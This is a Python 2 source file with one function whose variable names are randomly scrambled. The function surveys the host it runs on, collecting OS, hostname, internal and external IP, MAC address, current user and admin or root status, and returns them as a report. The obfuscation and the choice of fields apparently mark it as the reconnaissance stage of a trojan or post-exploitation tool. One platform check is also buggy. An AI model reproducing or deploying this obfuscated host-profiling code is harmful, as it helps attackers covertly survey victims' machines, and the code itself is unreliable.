# -*- coding: utf-8 -*-
import ctypes
import getpass
import os
import platform
import socket
import urllib
import uuid
def rphzMalkzLSwhCycxxBfPLhpijexPGfP(plat_type):
    PeioHixKoqCjWUDzEQdVEXplzBlgHgZF = platform.platform()
    processor    = platform.processor()
    architecture = platform.architecture()[0]
    ssIBLWmenWpzTLPufiaXeQwHnANDsDKU = getpass.getuser()
    DjOzmFCviylzqCnfSSdheQWDGtkEmfBk    = socket.gethostname()
    QaLEItFKQfMTIvbGQxYmTwhBkOdcSMPE        = socket.getfqdn()
    QOqfHHgdHfzPawUADigpwfGcfZRZPLkU = socket.gethostbyname(DjOzmFCviylzqCnfSSdheQWDGtkEmfBk)
    OskpaLNAJIUtfgjdlTRwPSkMyMeNzRBZ     = uuid.getnode()
    JtUesNfQNalvicEibIzMwPdXBpRuhRfm         = ':'.join(("%012X" % OskpaLNAJIUtfgjdlTRwPSkMyMeNzRBZ)[eaWzUUoBaFBvNibqBoBuJfYbyNkcvhqX:eaWzUUoBaFBvNibqBoBuJfYbyNkcvhqX+2] for eaWzUUoBaFBvNibqBoBuJfYbyNkcvhqX in range(0, 12, 2))
    ejQMjqeibrVvdMTkBGVXMvoXsCizqFqi = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw' ]
    EHbcakIIKNJsNKLexTRGZPqbClfvAouH = ''
    for RfcDgMPxKpienDtEZyWQZHLByHiyQcXl in ejQMjqeibrVvdMTkBGVXMvoXsCizqFqi:
        try:
            EHbcakIIKNJsNKLexTRGZPqbClfvAouH = urllib.urlopen('http://'+RfcDgMPxKpienDtEZyWQZHLByHiyQcXl).read().rstrip()
        except IOError:
            pass
        if EHbcakIIKNJsNKLexTRGZPqbClfvAouH and (6 < len(EHbcakIIKNJsNKLexTRGZPqbClfvAouH) < 16):
            break
    llTCZLUWSbXjDFekWCeMVOpNEBvHyvtV = False
    if plat_type.startswith('win'):
        llTCZLUWSbXjDFekWCeMVOpNEBvHyvtV = ctypes.windll.shell32.IsUserAnAdmin() != 0
    elif plat_type.startswith('linux') or platform.startswith('darwin'):
        llTCZLUWSbXjDFekWCeMVOpNEBvHyvtV = os.getuid() == 0
    nOawHmDxXsWGMBvNyopKMbqYuVgTgJgk = 'Yes' if llTCZLUWSbXjDFekWCeMVOpNEBvHyvtV else 'No'
    IIkllwPuAsXaCwbTtGFoXikGBIWWIqmQ = '''
    System Platform     - {}
    Processor           - {}
    Architecture        - {}
    Hostname            - {}
    FQDN                - {}
    Internal IP         - {}
    External IP         - {}
    MAC Address         - {}
    Current User        - {}
    Admin Access        - {}
    '''.format(PeioHixKoqCjWUDzEQdVEXplzBlgHgZF, processor, architecture,
    DjOzmFCviylzqCnfSSdheQWDGtkEmfBk, QaLEItFKQfMTIvbGQxYmTwhBkOdcSMPE, QOqfHHgdHfzPawUADigpwfGcfZRZPLkU, EHbcakIIKNJsNKLexTRGZPqbClfvAouH, JtUesNfQNalvicEibIzMwPdXBpRuhRfm, ssIBLWmenWpzTLPufiaXeQwHnANDsDKU, nOawHmDxXsWGMBvNyopKMbqYuVgTgJgk)
    return IIkllwPuAsXaCwbTtGFoXikGBIWWIqmQ
